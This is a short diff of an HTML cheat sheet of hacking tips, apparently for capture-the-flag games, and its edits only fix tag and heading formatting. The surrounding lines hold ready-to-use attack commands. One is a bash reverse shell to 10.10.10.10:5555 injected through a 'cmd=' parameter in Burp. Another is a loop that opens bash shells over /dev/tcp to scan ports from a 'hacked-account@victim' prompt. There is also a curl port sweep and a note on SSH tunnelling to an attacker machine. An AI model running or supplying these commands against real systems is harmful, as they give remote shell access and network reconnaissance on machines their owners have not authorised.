@@ -457,10 +457,10 @@ open upp burp and run command in the bottom of the page:
 <code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
 
 
-<h1Random Tips and Tricks</h1>
+<h1>Random Tips and Tricks</h1>
+
 
 <h2>SSH Tunneling</h2>
-
 
 Tunnel traffic over ssh to your attacker machine so you can act as the machine you have ssh in to.
 
@@ -490,7 +490,7 @@ and your IP changes just before the game starts, and no script have the correct 
 <b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>
 
 
-<h2>Portscan with Bash</h2>
+<h2>Portscan with BASH</h2>
 
 
 <b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>
@@ -501,7 +501,7 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>hacked-account@victim ~/: <b/><code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
 
-<h2>Portscan with Curl</h2>
+<h2>Portscan with CURL</h2>
 
 <b>hacked-account@victim ~/: <b/><code>curl http://10.10.20.20:[1-6000]</code>
 
